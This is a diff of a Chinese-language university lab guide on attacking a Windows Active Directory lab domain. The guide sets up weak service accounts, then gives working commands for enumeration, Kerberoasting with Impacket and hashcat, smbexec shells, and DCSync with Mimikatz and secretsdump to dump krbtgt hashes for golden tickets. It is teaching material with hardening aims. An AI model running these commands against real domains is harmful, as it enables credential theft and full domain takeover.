@@ -4,309 +4,299 @@ title: "实验六：Windows域环境渗透与提权"
 
 # 实验六：Windows域环境渗透与提权
 
-> 对应章节：项目六 Windows域管理
-实验目标：掌握域控搭建与域信息收集、Kerberoasting、DCSync/黄金票据等核心攻击链，并完成相应的加固验证（Protected Users、krbtgt 密码、最小权限服务账户等）
-预计用时：150分钟
-难度等级：⭐⭐⭐⭐（高级）
-> 
+> 对应章节：项目六 Windows 域管理  
+> 实验目标：掌握域信息收集、Kerberoasting、DCSync、BloodHound 路径分析与基础加固验证的完整流程  
+> 预计用时：150 分钟  
+> 难度等级：⭐⭐⭐⭐（高级）  
+> 适用范围：仅限隔离、授权的教学靶场，禁止用于真实生产域环境
+
+## 一、实验概览
+
+### 1.1 实验主线
+
+本实验围绕一条比较典型的域攻击链展开。阅读和操作时，不要把它看成一堆分散的命令，而要把它理解成“攻击者怎样一步一步把权限做大”的完整过程：
+
+1. 使用普通域用户完成域信息收集。
+2. 枚举可 Kerberoasting 的服务账户并离线破解弱密码。
+3. 利用被错误授权的高权限服务账户执行 DCSync。
+4. 提取 `krbtgt` 哈希，理解黄金票据的伪造条件与危害。
+5. 使用 BloodHound 分析攻击路径，并完成基础加固与复测。
+
+### 1.2 实验成功标准
+
+完成本实验后，应尽量达到下面几个目标：
+
+- 能自己判断一台主机是不是域控，并说清楚关键端口分别在做什么。
+- 能用普通域用户完成一次标准的域信息收集，并导出可用于 Kerberoasting 的 TGS 哈希。
+- 能解释为什么服务账户一旦弱口令、永不过期、权限又大，就会成为域环境里的高危点。
+- 能说明 DCSync 到底在“同步”什么，为什么拿到 `krbtgt` 哈希后风险会一下子升级。
+- 能从防守者角度提出至少 3 条有效加固措施，并用复测结果证明加固确实生效。
+
+### 1.3 实验边界
+
+> 本实验涉及 Kerberoasting、DCSync、黄金票据等高风险技术。所有命令、账户和密码都只能在实验靶场里使用。实验结束后应恢复快照、重置密码或删除测试对象，避免把高风险配置留在环境里。
 
 ---
 
-# 第一部分：前置知识点
+## 二、前置知识点
 
-## 1. Active Directory域服务核心概念
+### 2.1 Active Directory 核心逻辑结构
 
-### 1.1 AD DS逻辑结构
+开始操作前，先不要急着直接跑命令。域渗透和单机提权最大的不同，在于它不是盯着一台机器，而是在看“整张身份和权限关系网”。因此需要先把 AD 的逻辑结构理清楚。
 
-```
-Active Directory的逻辑层级结构：
-
+```text
 森林（Forest）
-│   • 最高级别的AD容器
-│   • 包含一个或多个域树
-│   • 森林间有双向传递信任
-│
-├── 域树（Tree）
-│   │   • 共享连续的DNS命名空间
-│   │   例：corp.local → sub.corp.local
-│   │
-│   └── 域（Domain）
-│       │   • 基本管理单元
-│       │   例：corp.local
-│       │
-│       ├── 组织单元（OU）
-│       │   • 容器对象，用于组织用户/计算机/组
-│       │   • 可链接GPO实现策略下发
-│       │   • 例：OU=员工,DC=corp,DC=local
-│       │   │
-│       │   ├── 用户（User）
-│       │   ├── 计算机（Computer）
-│       │   └── 组（Group）
-│       │
-│       └── 信任关系（Trust）
-│           • 域间信任：允许一个域的用户访问另一个域的资源
-│           • 单向信任 / 双向信任
-│           • 可传递信任 / 不可传递信任
+└── 域树（Tree）
+    └── 域（Domain）
+        ├── 组织单元（OU）
+        │   ├── 用户（User）
+        │   ├── 计算机（Computer）
+        │   └── 组（Group）
+        └── 信任关系（Trust）
 ```
 
-### 1.2 域控制器（DC）核心组件
+| 组件 | 作用 | 示例 |
+| --- | --- | --- |
+| Forest | AD 的最高逻辑边界 | `corp.local` 所属森林 |
+| Tree | 共享连续 DNS 命名空间的一组域 | `corp.local`、`sub.corp.local` |
+| Domain | 认证、授权与管理的基本边界 | `corp.local` |
+| OU | 用于组织对象与下发 GPO | `OU=IT,DC=corp,DC=local` |
+| Group | 方便授权和委派 | `Domain Admins` |
+| Trust | 跨域/跨林访问的信任基础 | 双向可传递信任 |
 
+### 2.2 域控制器上的关键资产
+
+这里需要强调：域控最重要的不只是“它是一台服务器”，而是“它是整套身份体系的中心”。谁控制了域控，谁就几乎控制了整个域。
+
+| 资产/服务 | 作用 | 失陷风险 |
+| --- | --- | --- |
+| `NTDS.dit` | 存储域对象与密码相关数据 | 可导出全域账号哈希 |
+| DNS | 域名解析 | 域成员无法正常定位 DC |
+| Kerberos KDC | 颁发 TGT 和服务票据 | 可被滥用于票据攻击 |
+| LDAP/LDAPS | 目录查询 | 可被用于枚举用户、组、SPN |
+| SYSVOL/NETLOGON | 存储登录脚本与策略文件 | 可泄露脚本、口令和策略 |
+| `krbtgt` | Kerberos 票据签名账户 | 泄露后可伪造黄金票据 |
+
+### 2.3 Kerberos 认证流程
+
+下面这个流程图大家一定要看懂。后面 Kerberoasting、白银票据、黄金票据，本质上都是在利用 Kerberos 正常工作流程里的某一环。
+
+```text
+用户登录            域控制器（KDC）                    目标服务
+┌─────┐           ┌──────────────┐                 ┌──────────────┐
+│ 用户 │ --AS-REQ-->  AS（认证服务）                  │              │
+│     │ <--TGT-----  返回 TGT                        │              │
+│     │                                             │              │
+│     │ --TGS-REQ(TGT)---------------------------->  TGS（票据授予）│
+│     │ <----Service Ticket-----------------------  返回服务票据    │
+│     │                                             │              │
+│     │ --AP-REQ(Service Ticket)---------------------------------->│
+│     │ <----------------------------- 服务响应 -------------------│
+└─────┘           └──────────────┘                 └──────────────┘
 ```
-域控制器上运行的核心服务和数据库：
 
-┌─────────────────────────────────────────────────┐
-│               域控制器（DC）                       │
-│                                                   │
-│  ┌──────────────────────────────────────┐         │
-│  │  NTDS.dit（AD数据库文件）            │         │
-│  │  • 存储所有域对象                    │         │
-│  │  • 用户账户和密码哈希                │         │
-│  │  • 组策略对象（GPO）                 │         │
-│  │  • 计算机账户和DNS记录               │         │
-│  └──────────────────────────────────────┘         │
-│                                                   │
-│  ┌──────────────────────────────────────┐         │
-│  │  关键服务                              │         │
-│  │  • DNS Server（AD必需依赖）          │         │
-│  │  • Kerberos KDC（认证服务）          │         │
-│  │  • LDAP（目录查询服务）              │         │
-│  │  • NetLogon（域登录验证）            │         │
-│  │  • SYSVOL（组策略文件共享）          │         │
-│  └──────────────────────────────────────┘         │
-└─────────────────────────────────────────────────┘
+| 票据 | 含义 | 常见攻击面 |
+| --- | --- | --- |
+| TGT | 证明用户已通过初始认证 | 黄金票据 |
+| Service Ticket | 证明用户可访问指定服务 | Kerberoasting、白银票据 |
+
+### 2.4 Kerberos 常见攻击面
+
+| 攻击方式 | 基本原理 | 典型前提 |
+| --- | --- | --- |
+| Kerberoasting | 请求服务票据并离线破解服务账户密码 | 普通域用户、目标账户存在 SPN |
+| AS-REP Roasting | 枚举禁用预认证的账户并离线破解 | 账户未启用预认证 |
+| 白银票据 | 获取服务账户哈希后伪造特定服务票据 | 已获服务账户密钥 |
+| 黄金票据 | 获取 `krbtgt` 哈希后伪造任意 TGT | 已获域级复制或域管权限 |
+
+### 2.5 DCSync 与黄金票据的关系
+
+这一段是本实验的核心逻辑。不要把 DCSync 和黄金票据当成两个孤立的知识点，而要把它们连成一条完整的提权链。
+
+```text
+错误授权/高权限账户
+        │
+        ▼
+获得目录复制权限（DCSync）
+        │
+        ▼
+导出 Administrator / krbtgt 哈希
+        │
+        ▼
+伪造黄金票据（Golden Ticket）
+        │
+        ▼
+持久化域管访问能力
 ```
 
-### 1.3 域中存储的关键数据
+执行 DCSync 常见需要以下权限之一：
 
+- `Replicating Directory Changes`
+- `Replicating Directory Changes All`
+- `Domain Admins`
+- `Enterprise Admins`
+- `Administrators`
+
+> 理解重点：Kerberoasting 本身并不等于“直接拿下域管”。它更像是一个入口。真正决定能否从普通域用户一路走到全域控制的，是这个服务账户背后是否存在高权限、错误委派，或者可继续横向利用的能力。
+
+---
+
+## 三、实验环境配置
+
+### 3.1 网络拓扑
+
+```text
+┌─────────────────────┐                    ┌─────────────────────┐
+│     Kali Linux      │      NAT 网络      │   Windows Server    │
+│   2025.4（攻击机）  │ <---------------> │   2025（域控 DC01） │
+│  192.168.1.10       │   192.168.1.0/24   │   192.168.1.20      │
+└─────────────────────┘                    │   corp.local        │
+                                           └─────────────────────┘
 ```
-NTDS.dit中存储的高价值数据（域渗透的终极目标）：
 
-┌──────────────────┬─────────────────────────────────────┐
-│ 数据类型         │ 泄露后果                             │
-├──────────────────┼─────────────────────────────────────┤
-│ 用户密码哈希     │ 可离线破解所有域用户密码             │
-│ 计算机账户密码   │ 可伪造任意计算机身份                │
-│ krbtgt哈希       │ 可伪造黄金票据（任意用户TGT）       │
-│ 服务账户密码     │ 可Kerberoasting后接管服务            │
-│ GPO配置          │ 可篡改全域安全策略                    │
-│ 委派配置         │ 可获取额外权限                       │
-│ DNS记录          │ 可伪造DNS响应（DNS欺骗）           │
-└──────────────────┴─────────────────────────────────────┘
+### 3.2 角色与账户约定
+
+| 对象 | 角色 | 用途 |
+| --- | --- | --- |
+| `DC01.corp.local` | 域控制器 | DNS、KDC、LDAP、AD DS |
+| `CORP\\Administrator` | 域管理员 | 初始化、加固与验证 |
+| `CORP\\zhangsan` | 普通域用户 | 域信息收集、Kerberoasting |
+| `CORP\\sqlsvc` | 服务账户 | 演示弱口令服务账户风险 |
+| `CORP\\itadmin` | 高权限账号 | Protected Users 加固验证 |
+
+### 3.3 域控基础配置
+
+#### 3.3.1 安装 AD DS 并创建林
+
+这里建议边做边记。域环境中的很多故障，最后都能追溯到最开始的主机名、DNS 或林初始化参数没有配对。
+
+在 Windows Server 上使用管理员 PowerShell 执行：
+
+```powershell
+Rename-Computer -NewName "DC01" -Restart
+```
+
+重启后继续执行：
+
+```powershell
+Install-WindowsFeature AD-Domain-Services, DNS -IncludeManagementTools
+
+$SafeModePwd = ConvertTo-SecureString "P@ssw0rd123!" -AsPlainText -Force
+
+Install-ADDSForest `
+  -DomainName "corp.local" `
+  -DomainNetbiosName "CORP" `
+  -InstallDNS `
+  -SafeModeAdministratorPassword $SafeModePwd `
+  -Force
+```
+
+#### 3.3.2 创建实验对象
+
+下面这段脚本的目的，不是让大家背命令，而是让大家明确域里哪些对象是“普通用户”、哪些是“服务账户”、哪些对象将来会成为攻击链的关键节点。口令均为靶场示例，实验后应重置或删除。
+
+```powershell
+Import-Module ActiveDirectory
+
+New-ADOrganizationalUnit -Name "Servers" -Path "DC=corp,DC=local"
+New-ADOrganizationalUnit -Name "Employees" -Path "DC=corp,DC=local"
+New-ADOrganizationalUnit -Name "ServiceAccounts" -Path "DC=corp,DC=local"
+
+$UserPwd = ConvertTo-SecureString "P@ssw0rd123" -AsPlainText -Force
+$SvcPwd  = ConvertTo-SecureString "Service@2024" -AsPlainText -Force
+$AdmPwd  = ConvertTo-SecureString "Admin@2024!" -AsPlainText -Force
+
+New-ADUser -Name "zhangsan" -SamAccountName "zhangsan" `
+  -UserPrincipalName "zhangsan@corp.local" `
+  -AccountPassword $UserPwd -Enabled $true `
+  -Path "OU=Employees,DC=corp,DC=local"
+
+New-ADUser -Name "itadmin" -SamAccountName "itadmin" `
+  -UserPrincipalName "itadmin@corp.local" `
+  -AccountPassword $AdmPwd -Enabled $true `
+  -Path "OU=Employees,DC=corp,DC=local"
+
+New-ADUser -Name "sqlsvc" -SamAccountName "sqlsvc" `
+  -UserPrincipalName "sqlsvc@corp.local" `
+  -AccountPassword $SvcPwd -Enabled $true `
+  -PasswordNeverExpires $true `
+  -Path "OU=ServiceAccounts,DC=corp,DC=local"
+
+Set-ADUser -Identity "sqlsvc" -ServicePrincipalNames @{
+  Add = "MSSQLSvc/dc01.corp.local:1433"
+}
+```
+
+#### 3.3.3 可选：为教学演示准备“错误授权”场景
+
+如果需要把实验链条演示得更完整，可以在**隔离靶场**中额外准备一个被错误授权的高权限服务账户。例如：
+
+- 给 `sqlsvc` 赋予本地管理员权限；
+- 或错误委派目录复制权限；
+- 或让 `sqlsvc` 持有可被远程利用的高权限服务。
+
+> 建议：不要把“普通用户天生就有 DCSync 权限”设成默认前提，因为这既不真实，也容易误解提权路径。更合理的设计是：先让普通用户拿到服务账户，再观察这个服务账户为什么能继续往上走。
+
+### 3.4 攻击机准备
+
+```bash
+sudo tee /etc/resolv.conf >/dev/null <<'EOF'
+nameserver 192.168.1.20
+search corp.local
+EOF
+
+sudo apt update
+sudo apt install -y crackmapexec ldap-utils hashcat bloodhound-python
+```
+
+如需验证 Kerberos 解析，也可补充：
+
+```bash
+host dc01.corp.local 192.168.1.20
+nslookup corp.local 192.168.1.20
 ```
 
 ---
 
-## 2. Kerberos认证协议精讲
-
-### 2.1 Kerberos认证流程
-
-```
-Kerberos是域环境的默认认证协议，基于"票据（Ticket）"机制：
-
-用户登录                     KDC（域控制器上）                    访问资源
-┌─────┐           ┌──────────────┐           ┌──────────────┐           ┌─────┐
-│ 用户 │──AS请求──►│    AS        │           │    TGS       │           │ 文件 │
-│     │           │ 认证服务     │           │ 票据授予服务  │           │ 服务器│
-│     │ ◄─TGT─────│              │           │              │           │     │
-│     │           │  TGT（黄金票据）│           │              │           │     │
-│     │           │  可访问TGS   │           │              │           │     │
-├─────┤           └──────────────┘           └──────────────┘           └─────┘
-│     │  ──TGS-REQ(TGT)──────────────────────────────────────────────────────────►
-│     │  ◄─Service Ticket───────────────────────────────────────────────────────────
-│     │
-│     │  ──AP-REQ(Service Ticket)─────────────────────────────────────────────────►
-│     │
-│     │  ◄─服务响应────────────────────────────────────────────────────────────────
-
-关键票据说明：
-TGT（Ticket Granting Ticket）：
-  • 由AS颁发，证明用户已通过初始认证
-  • 有效期通常10小时
-  • ⚠️ 获取krbtgt哈希可伪造任意TGT → 黄金票据攻击
-
-Service Ticket（服务票据）：
-  • 由TGS颁发，证明用户有权访问特定服务
-  • 绑定特定SPN（Service Principal Name）
-  • ⚠️ 可离线破解 → Kerberoasting攻击
-```
-
-### 2.2 Kerberos攻击方法概览
-
-```
-┌─────────────────────────────────────────────────────────────────┐
-│                    Kerberos 攻击面                              │
-├──────────────────┬──────────────────────────────────────────────┤
-│ 攻击方法         │ 原理与利用条件                         │
-├──────────────────┼──────────────────────────────────────────────┤
-│ Kerberoasting   │ 请求服务票据(TGS) → 离线破解密码        │
-│                  │ 条件：普通域用户即可（需SPN的账户）      │
-│                  │ 本实验重点 ✓                           │
-├──────────────────┼──────────────────────────────────────────────┤
-│ 黄金票据         │ 获取krbtgt哈希 → 伪造任意用户TGT      │
-│ (Golden Ticket)  │ 条件：需要域管权限（DCSync）          │
-│                  │ 效果：持久化域管权限                    │
-├──────────────────┼──────────────────────────────────────────────┤
-│ 白银票据         │ 获取服务账户哈希 → 伪造特定服务票据   │
-│ (Silver Ticket)  │ 条件：需要服务账户的NTLM Hash         │
-│                  │ 效果：以该服务身份访问资源              │
-├──────────────────┼──────────────────────────────────────────────┤
-│ AS-REP Roasting │ 请求不需预认证的用户票据 → 离线破解     │
-│                  │ 条件：账户设置了"Do not require Kerberos │
-│                  │        preauthentication"属性               │
-└──────────────────┴──────────────────────────────────────────────┘
-```
-
----
-
-## 3. DCSync攻击详解
-
-### 3.1 DCSync原理
-
-```
-DCSync（目录复制服务同步）是域控之间同步AD数据库的合法机制。
-攻击者利用DCSync权限伪装为域控，从目标域控复制所有用户密码哈希。
-
-正常域控同步：
-  DC01 ─── DCReplicaSync ───► DC02
-  (请求复制所有用户哈希)         (返回完整数据)
-
-DCSync攻击：
-  攻击者 ── DCSync ───► DC01
-  (伪造域控请求复制)     (返回所有用户哈希！)
-
-所需权限：
-  • Replicating Directory Changes
-  • Replicating Directory Changes All
-  • 或直接属于 Domain Admins / Enterprise Admins
-
-导出内容：
-  • 所有域用户的NTLM Hash（包括Administrator和krbtgt）
-  • krbtgt哈希 → 用于伪造黄金票据
-  • 用户密码历史记录
-```
-
-### 3.2 黄金票据攻击链
-
-```
-获取krbtgt哈希 → 伪造TGT → 获取域管权限 → 持久化访问
-
-详细步骤：
-┌─────────────────┐
-│ 1. 获取krbtgt哈希 │
-│    DCSync攻击      │
-│    secretsdump     │
-│    Mimikatz:       │
-│    lsadump::dcsync│
-└────────┬────────┘
-         ▼
-┌─────────────────┐
-│ 2. 伪造黄金票据   │
-│    ticketer.py     │
-│    需要参数：      │
-│    • 域SID        │
-│    • 域名          │
-│    • krbtgt NTLM   │
-│    • 伪造用户名    │
-└────────┬────────┘
-         ▼
-┌─────────────────┐
-│ 3. 使用票据认证   │
-│    psexec/wmiexec  │
-│    访问域控C$     │
-│    导出AD数据      │
-│    修改域策略      │
-└─────────────────┘
-
-防御：修改krbtgt密码两次（使旧票据失效）+ Protected Users组
-```
-
-> **实验关键提示**：本实验是域渗透的核心实验，涵盖信息收集、Kerberoasting、DCSync、BloodHound 与黄金票据等关键技术。核心目标是理解“从普通域用户到域管”的路径与每一步的防御措施。实验结束后需更改 krbtgt 密码、启用 Protected Users 等加固项来切断攻击链。
-> 
-
----
-
-# 第二部分：实验操作
-
-## 一、实验环境配置
-
-### 1.1 网络拓扑
-
-```
-┌─────────────────────┐                                    ┌─────────────────────┐
-│    Kali Linux       │              NAT模式                │  Windows Server     │
-│   2025.4（攻击机）  │◄──────────────────────────────────► │    2025（域控）      │
-│  IP: 192.168.1.10   │         192.168.1.0/24              │  IP: 192.168.1.20   │
-└─────────────────────┘                                    │  域名: corp.local    │
-                                                            └─────────────────────┘
-```
-
-### 1.2 靶机环境详细配置
-
-> **注意**：本实验需要一台 **域控制器（DC）** 。建议使用Windows Server 2025，搭建单域单控环境。如资源有限，也可在一台服务器上同时充当域控和成员服务器。
-> 
-
-**虚拟机设置**：
-
-| 项目 | 配置 |
-| --- | --- |
-| 内存 | 4 GB（域控建议不低于2GB） |
-| 网络适配器 | NAT模式 |
-| 快照 | 实验前创建快照（命名：实验六-初始状态） |
-
-**域控初始化脚本**（管理员PowerShell执行）：
-
-# ============================================
-
-**域环境配置脚本**（重启后以域管理员 `CORP\Administrator` 登录执行）：
-
-# ============================================
-
-**攻击机配置**：
-
-# 1. 配置Kali的DNS指向域控
-
----
-
-## 二、实验步骤
+## 四、实验步骤
 
 ### 阶段一：域信息收集
 
-**步骤1：基本域信息枚举**
+这一阶段要养成一个习惯：先把环境摸清楚，再谈攻击。不做画像，后面的每一步都会像在黑屋子里乱撞。
 
-```
-# 使用Nmap扫描域控开放端口
+### 阶段目标
+
+- 明确目标主机是不是域控。
+- 把这个域里最基本的“人、组、机器、策略”摸清楚。
+- 给后面的 Kerberoasting 和 BloodHound 分析准备可靠输入。
+
+### 步骤 1：识别域控关键端口
+
+```bash
 nmap -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,3389 192.168.1.20
-
-# 预期关键端口（示例）：
-# 53/tcp   open  domain       (DNS)
-# 88/tcp   open  kerberos-sec (Kerberos)
-# 389/tcp  open  ldap         (LDAP)
-# 445/tcp  open  microsoft-ds (SMB)
-# 636/tcp  open  ldapssl      (LDAPS)
-# 3268/tcp open  ldap         (GC)
 ```
 
-> **知识关联**：对应讲义中”域控制器的部署准备条件”——域控需要DNS服务（53）、Kerberos认证（88）、LDAP（389/636）等端口。
-> 
+预期关注端口：
 
-**步骤2：LDAP匿名绑定枚举**
+- `53/tcp`：DNS
+- `88/tcp`：Kerberos
+- `389/tcp`：LDAP
+- `445/tcp`：SMB
+- `636/tcp`：LDAPS
+- `3268/tcp`：Global Catalog
 
+这里可以顺手追问或自问：为什么一看到 `88`、`389`、`445`、`3268` 这几个端口同时出现，就会高度怀疑目标是域控，而不是一台普通成员服务器？
+
+### 步骤 2：LDAP 枚举基础信息
+
+```bash
+ldapsearch -x -H ldap://192.168.1.20 \
+  -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName
 ```
-# 使用ldapsearch匿名枚举域信息（是否成功取决于DC是否允许匿名绑定）
-ldapsearch -x -H ldap://192.168.1.20 -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName
 
-# 使用windapsearch（如已安装）
-git clone https://github.com/ropnop/windapsearch.git
-cd windapsearch
-python3 windapsearch.py -d corp.local -u "" -p "" --dc-ip 192.168.1.20 -U
-python3 windapsearch.py -d corp.local -u "" -p "" --dc-ip 192.168.1.20 -G
-python3 windapsearch.py -d corp.local -u "" -p "" --dc-ip 192.168.1.20 --computers
-```
+如果允许匿名绑定，可继续收集更多对象信息；若匿名绑定被禁用，则使用普通域用户继续：
 
-**步骤3：使用CrackMapExec进行域枚举**
-
-```
-# 使用已获取的域用户凭据进行枚举（示例）
+```bash
 crackmapexec ldap 192.168.1.20 -d corp.local -u zhangsan -p 'P@ssw0rd123' --users
 crackmapexec ldap 192.168.1.20 -d corp.local -u zhangsan -p 'P@ssw0rd123' --groups
 crackmapexec ldap 192.168.1.20 -d corp.local -u zhangsan -p 'P@ssw0rd123' --computers
@@ -314,224 +304,354 @@ crackmapexec ldap 192.168.1.20 -d corp.local -u zhangsan -p 'P@ssw0rd123' --doma
 crackmapexec ldap 192.168.1.20 -d corp.local -u zhangsan -p 'P@ssw0rd123' --password-policy
 ```
 
-> **知识关联**：对应讲义中”域渗透常见路径”——信息收集是域渗透的第一步，包括枚举域用户、组、计算机、密码策略等。
-> 
+这里不要只盯着“命令有没有回显”，更要看回显里透露出的组织结构。一个好的攻击者，看到的不只是用户列表，而是哪些用户像普通员工、哪些像运维、哪些像服务账户。
+
+### 步骤 3：枚举可被 Kerberoasting 的账户
+
+```bash
+/usr/share/doc/python3-impacket/examples/GetUserSPNs.py \
+  corp.local/zhangsan:'P@ssw0rd123' \
+  -dc-ip 192.168.1.20
+```
+
+重点观察：
+
+- 是否存在绑定 SPN 的服务账户；
+- 服务账户是否启用了弱密码、永不过期；
+- 服务账户是否持有高权限或被错误委派。
+
+> 记录建议：把域名、域控主机名、域用户、域组、密码策略、SPN 账户列表整理成表格，作为实验报告的“攻击前资产画像”。
 
 ---
 
-### 阶段二：Kerberoasting攻击
+### 阶段二：Kerberoasting 攻击
 
-**步骤4：请求服务票据（TGS）**
+这一阶段开始进入真正的攻击利用。Kerberoasting 之所以经典，不是因为它花哨，而是因为它往往只需要一个普通域用户就能启动。
 
-```
-# 使用Impacket的GetUserSPNs脚本（需要一个有效的域用户凭据）
-/usr/share/doc/python3-impacket/examples/GetUserSPNs.py corp.local/zhangsan:'P@ssw0rd123' -dc-ip 192.168.1.20 -request
+### 阶段目标
 
-# 将哈希保存到文件
-/usr/share/doc/python3-impacket/examples/GetUserSPNs.py corp.local/zhangsan:'P@ssw0rd123' -dc-ip 192.168.1.20 -request -outputfile /tmp/tgs_hashes.txt
-```
+- 请求服务票据并导出 TGS 哈希。
+- 完成一次离线破解，理解为什么服务账户特别危险。
+- 观察“弱口令 + 永不过期 + 高权限”是怎样组合成风险的。
 
-> **知识关联**：对应讲义中”Kerberos常见攻击 - Kerberoasting”——攻击者使用普通域用户权限请求服务票据后，离线暴力破解服务账户密码。服务账户通常使用弱密码且密码不定期更换。
-> 
-
-**步骤5：离线破解服务票据**
+### 步骤 4：请求服务票据
 
 ```bash
-# 使用Hashcat破解Kerberos TGS票据
-# 模式：13100 = Kerberos 5 TGS-REP etype 23
+/usr/share/doc/python3-impacket/examples/GetUserSPNs.py \
+  corp.local/zhangsan:'P@ssw0rd123' \
+  -dc-ip 192.168.1.20 \
+  -request \
+  -outputfile /tmp/tgs_hashes.txt
+```
+
+### 步骤 5：离线破解 TGS 哈希
+
+```bash
 hashcat -m 13100 /tmp/tgs_hashes.txt /usr/share/wordlists/rockyou.txt --force
-
-# 或使用John the Ripper
-john --format=krb5tgs /tmp/tgs_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
-
-# 预期输出（破解弱密码服务账户）：
-# MSSQLSvc/dc01.corp.local:1433::CORP:sqlsvc:a5f5...:Service@2024
-# HTTP/www.corp.local::CORP:websvc:a5f5...:Service@2024
 ```
 
-**步骤6：使用破解的凭据进行域渗透**
+或：
 
-# 使用破解出的服务账户密码进行PTT攻击 /usr/share/doc/python3-impacket/examples/secretsdump.py corp.local/sqlsvc:‘Service@2024’@192.168.1.20# 如果服务账户有特殊权限，可能直接导出域哈希# 使用impacket的smbexec获取shell /usr/share/doc/python3-impacket/examples/smbexec.py corp.local/sqlsvc:‘Service@2024’@192.168.1.20
+```bash
+john --format=krb5tgs /tmp/tgs_hashes.txt \
+  --wordlist=/usr/share/wordlists/rockyou.txt
+```
+
+示例输出：
+
+```text
+MSSQLSvc/dc01.corp.local:1433::CORP:sqlsvc:...:Service@2024
+```
+
+如果这里真的能爆出明文密码，需要立刻追问两个问题：第一，这个账户是谁在用；第二，这个账户到底能干什么。真正危险的从来不是“爆出一个密码”本身，而是“这个密码背后的身份边界”。
+
+### 步骤 6：验证服务账户风险
+
+```bash
+/usr/share/doc/python3-impacket/examples/smbexec.py \
+  corp.local/sqlsvc:'Service@2024'@192.168.1.20
+```
+
+如果当前靶场将 `sqlsvc` 设计为高权限或错误授权账户，可继续验证其权限边界：
+
+```bash
+/usr/share/doc/python3-impacket/examples/secretsdump.py \
+  corp.local/sqlsvc:'Service@2024'@192.168.1.20 \
+  -dc-ip 192.168.1.20
+```
+
+> 说明：并不是所有被 Kerberoasting 破解出来的服务账户都能直接 DCSync。真正危险的是“弱口令 + 高权限/错误授权”这两个条件叠加。
 
 ---
 
-### 阶段三：DCSync攻击导出域哈希
+### 阶段三：DCSync 导出域哈希
 
-**步骤7：检查DCSync所需权限**
+到了这一阶段，关注点要从“能拿一个服务账户”过渡到“能不能控制整个域”。重点应放在权限来源，而不是只记工具名。
 
-```bash
-# DCSync需要以下权限之一：
-# - Replicating Directory Changes (1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)
-# - Replicating Directory Changes All (1131f6ab-9c07-11d1-f79f-00c04fc2dcd2)
-# - Domain Admins
-# - Enterprise Admins
-# - Administrators
+### 阶段目标
 
-# 检查zhangsan是否有Replicating Directory Changes权限
-# 使用Get-ACL查看
+- 理解 DCSync 到底模拟了哪种合法行为。
+- 明确哪些权限才足以触发 DCSync。
+- 理解为什么一旦拿到 `krbtgt` 哈希，风险等级会从“高”直接跳到“极高”。
+
+### 步骤 7：确认复制权限前提
+
+满足以下任一条件时，账户可能可执行 DCSync：
+
+- 属于 `Domain Admins`
+- 属于 `Enterprise Admins`
+- 属于 `Administrators`
+- 被委派 `Replicating Directory Changes`
+- 被委派 `Replicating Directory Changes All`
+
+实验前应明确当前靶场中是哪一种前提成立。
+
+这一步需要真正理解透彻。最容易出现的误解，就是把 DCSync 理解成“某个工具自带的神奇功能”。其实不是，工具只是把“目录复制”这个合法机制拿来滥用了。
+
+### 步骤 8：在 Windows 靶机上使用 Mimikatz 执行 DCSync
+
+在已获得高权限会话的 Windows 主机中执行：
+
+```powershell
+cd C:\Tools
+.\mimikatz.exe
 ```
 
-**步骤8：使用Mimikatz执行DCSync**
+进入 Mimikatz 后：
 
-在已获取zhangsan会话的靶机上执行：
-
-```bash
-cd C:\Tools
-mimikatz.exe
-
-# 获取调试权限
+```text
 privilege::debug
-
-# DCSync攻击：模拟域控从其他域控复制，导出所有用户哈希
-lsadump::dcsync /domain:corp.local /all /csv
-
-# 导出特定用户哈希
 lsadump::dcsync /domain:corp.local /user:Administrator
 lsadump::dcsync /domain:corp.local /user:krbtgt
-
-# 预期输出（部分）：
-# User : Administrator
-# Domain : CORP
-# RID  : 000001f4 (500)
-# LM   :
-# NTLM : aad3b435b51404eeaad3b435b51404ee:8a3de542fcd2c13dd6a8f56e034a73be
-#
-# User : krbtgt
-# Domain : CORP
-# RID  : 000001f6 (502)
-# LM   :
-# NTLM : aad3b435b51404eeaad3b435b51404ee:4a8b9...   ← krbtgt哈希用于伪造黄金票据
+lsadump::dcsync /domain:corp.local /all /csv
 ```
 
-> **知识关联**：对应讲义中”Kerberos常见攻击 - 黄金票据”——获取krbtgt哈希后可伪造任意用户的TGT，实现持久化域管权限。
-> 
+重点关注输出中的：
 
-**步骤9：使用Impacket远程DCSync**
+- `Administrator` 的 NTLM 哈希；
+- `krbtgt` 的 NTLM 哈希；
+- 域 SID；
+- 账号 RID。
 
-# 使用已获取的域用户凭据远程执行DCSync /usr/share/doc/python3-impacket/examples/secretsdump.py corp.local/zhangsan:‘P@ssw0rd123’@192.168.1.20 -dc-ip 192.168.1.20 -just-dc# 导出结果包含所有域用户的NTLM哈希# 保存到文件 /usr/share/doc/python3-impacket/examples/secretsdump.py corp.local/zhangsan:‘P@ssw0rd123’@192.168.1.20 -dc-ip 192.168.1.20 -just-dc > /tmp/domain_hashes.txt
+这里可以停下来思考：为什么黄金票据不只是需要 `krbtgt` 哈希，还经常要配合域 SID 一起使用。
+
+### 步骤 9：使用 Impacket 远程执行 DCSync
+
+若当前已获得具备复制权限的账号，可在 Kali 上执行：
+
+```bash
+/usr/share/doc/python3-impacket/examples/secretsdump.py \
+  corp.local/sqlsvc:'Service@2024'@192.168.1.20 \
+  -dc-ip 192.168.1.20 \
+  -just-dc
+```
+
+如需留存报告，可重定向输出：
+
+```bash
+/usr/share/doc/python3-impacket/examples/secretsdump.py \
+  corp.local/sqlsvc:'Service@2024'@192.168.1.20 \
+  -dc-ip 192.168.1.20 \
+  -just-dc > /tmp/domain_hashes.txt
+```
+
+> 报告要求：输出内容必须脱敏，不得原样粘贴完整哈希。建议仅保留前 8 位与后 4 位做教学说明。
 
 ---
 
-### 阶段四：BloodHound域攻击路径分析
+### 阶段四：BloodHound 攻击路径分析
 
-**步骤10：收集域信息并导入BloodHound**
+前面已经用命令行做了点状枚举，这一阶段要把点连成线。BloodHound 的价值，不在于“图看起来很酷”，而在于它能把原本零散的权限关系变成一条可解释的攻击路径。
 
-# 使用SharpHound收集域信息（需要域用户凭据）
+### 阶段目标
 
-**步骤11：在BloodHound中分析攻击路径**
+- 从零散枚举切换到路径化分析。
+- 看清普通用户、服务账户、高权限组之间是怎么连起来的。
+- 找出最短提权路径和最值得修的错误授权点。
 
